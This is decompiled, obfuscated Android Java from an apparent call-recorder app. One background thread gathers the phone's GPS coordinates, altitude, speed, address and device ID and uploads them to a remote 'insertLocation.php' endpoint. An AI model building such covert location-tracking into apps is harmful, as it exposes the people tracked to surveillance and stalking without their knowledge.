package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.a;
import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import android.location.Location;
import com.app.received.LocationReceived;
import com.crashlytics.android.Crashlytics;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/* compiled from: Locations */
public class f extends Thread {

    /* renamed from: a reason: collision with root package name */
    private final Context f223a;

    /* renamed from: b reason: collision with root package name */
    private Location f224b = null;

    public f(Context context, Location location) {
        this.f223a = context;
        this.f224b = location;
    }

    public void run() {
        try {
            SimpleDateFormat d2 = c.d();
            String str = "location/insertLocation.php";
            String str2 = "gps";
            String str3 = "address";
            String str4 = "accuracy";
            String str5 = "speed";
            String str6 = "altitude";
            String str7 = "latitude";
            String str8 = "longitude";
            String str9 = "date";
            String str10 = "idPhone";
            String str11 = "";
            if (this.f224b == null) {
                String format = d2.format(new Date());
                HashMap hashMap = new HashMap();
                StringBuilder sb = new StringBuilder();
                sb.append(str11);
                sb.append(e.e(this.f223a));
                hashMap.put(str10, sb.toString());
                hashMap.put(str9, format);
                hashMap.put(str8, str11);
                hashMap.put(str7, str11);
                hashMap.put(str6, str11);
                hashMap.put(str5, str11);
                hashMap.put(str4, str11);
                hashMap.put(str3, "notLocation");
                hashMap.put(str2, str11);
                StringBuilder sb2 = new StringBuilder();
                sb2.append(str11);
                sb2.append(format);
                long a2 = a.a(sb2.toString(), "", "", "", "", "", "notLocation", "", this.f223a);
                if (a.c.e.a.b(str, (Map<String, String>) hashMap)) {
                    a.c((int) a2, this.f223a);
                    return;
                }
                return;
            }
            StringBuilder sb3 = new StringBuilder();
            sb3.append("http://maps.google.com/maps?q=");
            sb3.append(this.f224b.getLatitude());
            sb3.append(",");
            sb3.append(this.f224b.getLongitude());
            String sb4 = sb3.toString();
            String a3 = LocationReceived.a(this.f224b, this.f223a);
            StringBuilder sb5 = new StringBuilder();
            sb5.append(str11);
            String str12 = str;
            sb5.append(this.f224b.getAccuracy());
            sb5.append(" m");
            String sb6 = sb5.toString();
            String format2 = d2.format(Long.valueOf(this.f224b.getTime()));
            HashMap hashMap2 = new HashMap();
            String str13 = str2;
            StringBuilder sb7 = new StringBuilder();
            sb7.append(str11);
            String str14 = sb4;
            sb7.append(e.e(this.f223a));
            hashMap2.put(str10, sb7.toString());
            hashMap2.put(str9, format2);
            StringBuilder sb8 = new StringBuilder();
            sb8.append(str11);
            sb8.append(this.f224b.getLongitude());
            hashMap2.put(str8, sb8.toString());
            StringBuilder sb9 = new StringBuilder();
            sb9.append(str11);
            sb9.append(this.f224b.getLatitude());
            hashMap2.put(str7, sb9.toString());
            StringBuilder sb10 = new StringBuilder();
            sb10.append(str11);
            sb10.append(this.f224b.getAltitude());
            hashMap2.put(str6, sb10.toString());
            StringBuilder sb11 = new StringBuilder();
            sb11.append(str11);
            sb11.append(this.f224b.getSpeed());
            hashMap2.put(str5, sb11.toString());
            StringBuilder sb12 = new StringBuilder();
            sb12.append(str11);
            sb12.append(sb6);
            hashMap2.put(str4, sb12.toString());
            StringBuilder sb13 = new StringBuilder();
            sb13.append(str11);
            sb13.append(a3);
            hashMap2.put(str3, sb13.toString());
            StringBuilder sb14 = new StringBuilder();
            sb14.append(str11);
            String str15 = str14;
            sb14.append(str15);
            hashMap2.put(str13, sb14.toString());
            StringBuilder sb15 = new StringBuilder();
            sb15.append(str11);
            sb15.append(format2);
            String sb16 = sb15.toString();
            StringBuilder sb17 = new StringBuilder();
            sb17.append(str11);
            sb17.append(this.f224b.getLongitude());
            String sb18 = sb17.toString();
            StringBuilder sb19 = new StringBuilder();
            sb19.append(str11);
            sb19.append(this.f224b.getLatitude());
            String sb20 = sb19.toString();
            StringBuilder sb21 = new StringBuilder();
            sb21.append(str11);
            sb21.append(this.f224b.getAltitude());
            String sb22 = sb21.toString();
            StringBuilder sb23 = new StringBuilder();
            sb23.append(str11);
            sb23.append(this.f224b.getSpeed());
            String sb24 = sb23.toString();
            StringBuilder sb25 = new StringBuilder();
            sb25.append(str11);
            sb25.append(sb6);
            String sb26 = sb25.toString();
            StringBuilder sb27 = new StringBuilder();
            sb27.append(str11);
            sb27.append(a3);
            String sb28 = sb27.toString();
            StringBuilder sb29 = new StringBuilder();
            sb29.append(str11);
            sb29.append(str15);
            long a4 = a.a(sb16, sb18, sb20, sb22, sb24, sb26, sb28, sb29.toString(), this.f223a);
            if (a.c.e.a.b(str12, (Map<String, String>) hashMap2)) {
                a.c((int) a4, this.f223a);
            }
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }
}
